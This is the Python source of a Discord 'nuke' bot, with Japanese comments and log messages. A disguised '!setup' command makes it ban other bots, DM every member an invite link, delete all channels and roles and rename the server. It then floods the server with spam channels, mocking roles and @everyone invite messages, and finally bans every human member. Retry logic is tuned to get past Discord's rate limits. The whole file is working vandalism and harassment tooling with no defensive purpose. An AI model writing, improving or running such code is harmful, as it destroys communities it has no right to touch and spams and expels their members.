import discord
from discord.ext import commands
import asyncio
import random
import os
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("TOKEN")
PREFIX = "!"
DEFAULT_NEW_NAME = "ますまに共栄圏植民地"
INVITE_LINK = "https://discord.gg/tqNR7BsAsR"

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

guild_member_counts = {}

@bot.event
async def on_guild_join(guild):
    count = sum(1 for m in guild.members if not m.bot)
    guild_member_counts[guild.id] = count

sem_global = asyncio.Semaphore(30)   # 同時数を抑えて安定
sem_message = asyncio.Semaphore(60)
sem_dm = asyncio.Semaphore(15)

async def limited_global(coro):
    async with sem_global:
        try:
            await coro
        except:
            pass

async def limited_message(coro):
    async with sem_message:
        try:
            await coro
        except:
            pass

async def limited_dm(coro):
    async with sem_dm:
        try:
            await coro
        except:
            pass

async def send_dm(member):
    try:
        await member.send(INVITE_LINK)
    except:
        pass

async def create_channel_safely(guild, counter, name):
    try:
        ch = await guild.create_text_channel(name)
        return ch
    except discord.HTTPException as e:
        if e.status == 429:
            retry = getattr(e, 'retry_after', 3)
            await asyncio.sleep(retry + 0.2)
            return await create_channel_safely(guild, counter, name)
        return None

async def delete_all_roles_task(guild):
    print("ロール削除開始...")
    roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
    deleted = 0
    for r in roles_to_delete:
        retries = 0
        while retries < 10:  # 再試行増やして確実に
            try:
                await r.delete()
                deleted += 1
                break
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(getattr(e, 'retry_after', 2) + 0.3)
                    retries += 1
                else:
                    break
            except:
                break
        if deleted % 10 == 0:
            print(f"ロール削除進捗: {deleted}/{len(roles_to_delete)}")
    print(f"ロール削除完了: {deleted}/{len(roles_to_delete)}")

async def create_colored_roles_task(guild, target_roles):
    print("ロール作成開始...")
    current = 0
    created = 0
    while current < target_roles:
        try:
            role = await guild.create_role(
                name="ますまに共栄圏に荒らされましたｗｗｗ",
                color=discord.Color.random(),
                reason=""
            )
            created += 1
            current += 1
            if created % 10 == 0:
                print(f"ロール作成進捗: {created}/{target_roles}")
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(getattr(e, 'retry_after', 3) + 0.3)
            else:
                break
        except:
            break
    print(f"ロール作成完了: {created}/{target_roles}")

async def core_nuke(guild, new_server_name=None):
    new_name = new_server_name or DEFAULT_NEW_NAME
    print("開始")

    members = [m for m in guild.members if m != bot.user]
    non_bot_members = [m for m in members if not m.bot]

    # 他のボットBAN
    bot_ban_tasks = [limited_global(guild.ban(m, reason="", delete_message_days=0)) for m in members if m.bot]
    await asyncio.gather(*bot_ban_tasks, return_exceptions=True)

    # DM（リンクのみ）
    dm_tasks = [limited_dm(send_dm(m)) for m in non_bot_members]
    await asyncio.gather(*dm_tasks)

    # 全チャンネル削除（逐次 + 再試行）
    print("チャンネル削除開始...")
    channels_to_delete = guild.channels[:]
    deleted_ch = 0
    for ch in channels_to_delete:
        retries = 0
        while retries < 10:
            try:
                await ch.delete()
                deleted_ch += 1
                break
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(getattr(e, 'retry_after', 2) + 0.3)
                    retries += 1
                else:
                    break
            except:
                break
        if deleted_ch % 10 == 0:
            print(f"チャンネル削除進捗: {deleted_ch}/{len(channels_to_delete)}")
    print("チャンネル削除完了")

    # サーバー名変更
    try:
        await guild.edit(name=new_name, reason="")
    except:
        pass

    # 規模別調整（sleep長めで安定重視）
    member_count = len(non_bot_members)
    if member_count < 100:
        target_channels = 100
        target_roles = 80
        channel_batch_size = 30
        batch_sleep_base = 0.15
        spam_sleep_min = 0.2
        spam_sleep_max = 0.5
    elif member_count < 500:
        target_channels = 80
        target_roles = 60
        channel_batch_size = 25
        batch_sleep_base = 0.25
        spam_sleep_min = 0.3
        spam_sleep_max = 0.7
    else:
        target_channels = 50
        target_roles = 40
        channel_batch_size = 20
        batch_sleep_base = 0.4
        spam_sleep_min = 0.5
        spam_sleep_max = 1.0

    # ロール削除タスク
    role_delete_task = asyncio.create_task(delete_all_roles_task(guild))

    # チャンネル作成（2種類交互）
    channels = []
    current = 0
    channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
    print("チャンネル作成開始")

    while len(channels) < target_channels:
        tasks = []
        for _ in range(channel_batch_size):
            if len(channels) >= target_channels:
                break
            current += 1
            name = channel_names[current % 2]
            tasks.append(create_channel_safely(guild, current, name))

        if not tasks:
            break

        created_batch = await asyncio.gather(*tasks, return_exceptions=True)
        added = sum(1 for r in created_batch if isinstance(r, discord.TextChannel))
        channels += [r for r in created_batch if isinstance(r, discord.TextChannel)]
        print(f"チャンネル作成進捗: {len(channels)}/{target_channels}")

        await asyncio.sleep(random.uniform(batch_sleep_base, batch_sleep_base + 0.3))

    # ロール作成タスク
    role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))

    # スパム
    spam_messages = [
        f"@everyone {INVITE_LINK}",
        f"@everyone 来い {INVITE_LINK}"
    ]

    message_counters = {ch.id: 0 for ch in channels}
    active_channels = channels.copy()

    print("スパム開始")

    while any(c < 100 for c in message_counters.values()):
        spam_tasks = []
        for ch in active_channels[:]:
            if message_counters[ch.id] >= 100:
                active_channels.remove(ch)
                continue

            async def send_one(ch=ch):
                try:
                    await limited_message(ch.send(random.choice(spam_messages)))
                    message_counters[ch.id] += 1
                except discord.HTTPException as e:
                    if e.status == 429:
                        await asyncio.sleep(getattr(e, 'retry_after', 3) + 0.5)
                except:
                    if ch in active_channels:
                        active_channels.remove(ch)

            spam_tasks.append(send_one())

        await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(random.uniform(spam_sleep_min, spam_sleep_max))

    print("スパム完了")

    # タスク待機
    await role_delete_task
    await role_create_task

    # BAN
    ban_tasks = [limited_global(guild.ban(m, reason=new_name, delete_message_days=0)) for m in non_bot_members]
    await asyncio.gather(*ban_tasks, return_exceptions=True)

    print("完了")

@bot.command(name="masumani", aliases=["setup"])
async def trigger(ctx, *, new_name: str = None):
    if ctx.guild:
        await ctx.message.delete()
        asyncio.create_task(core_nuke(ctx.guild, new_name))

@bot.event
async def on_ready():
    print(f"起動: {bot.user}")

bot.run(TOKEN)
